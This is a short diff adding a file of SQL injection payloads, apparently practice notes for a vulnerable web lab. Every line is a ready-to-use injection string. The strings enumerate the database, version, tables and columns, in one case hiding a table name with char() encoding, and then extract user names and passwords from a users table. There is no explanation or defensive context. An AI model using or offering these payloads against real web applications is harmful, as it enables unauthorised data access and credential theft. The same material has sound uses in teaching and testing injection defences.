@@ -1,0 +1,12 @@
+1' and 1=1#
+1' and 1=1 union select database(), user()#
+1' and 1=1 union select null, table_name from information_schema.tables#
+1' and 1=1 union select user, password from users#
+
+
+1. ?id=1' order by 1,2--+
+2. ?id=1' union select 1,2--+
+3. ?id=1' union select database(),version()--+
+4. ?id=1' union select 1,table_name from information_schema.tables--+
+5. ?id=1' union select 1,column_name from information_schema.columns where table_name=char(117,115,101,114,115)--+
+6. ?id=1' union select user,password from users--+
